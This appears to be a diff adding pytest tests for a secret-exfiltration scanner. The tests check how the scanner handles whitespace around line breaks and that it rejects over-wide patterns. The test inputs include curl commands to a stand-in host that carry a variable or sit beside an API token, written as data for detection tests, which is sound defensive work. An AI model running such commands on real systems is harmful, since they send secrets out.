@@ -58,3 +58,16 @@ def test_real_match_next_to_rejected_edge_candidate_is_flagged(edge, tail):
         "curl https://example.test/$MONKEY"
     text = _place(head, tail or "_URL", edge)
     assert scan_for_threats(text, scope="all") == ["exfil_curl"]
+
+
+def test_whitespace_collapse_keeps_line_breaks():
+    # Collapsing a blank-line run to a space would let a [^\n] span reach the next line.
+    assert scan_for_threats("curl https://example.test\n\n\nexport FOO=$API_TOKEN", scope="all") == []
+
+
+def test_pattern_wider_than_overlap_is_rejected(monkeypatch):
+    from tools import threat_patterns
+
+    monkeypatch.setattr(threat_patterns, "_PATTERNS", [(f"a{{{_CHUNK_OVERLAP + 1}}}", "too_wide", "all")])
+    with pytest.raises(ValueError, match="too_wide"):
+        threat_patterns._compile()
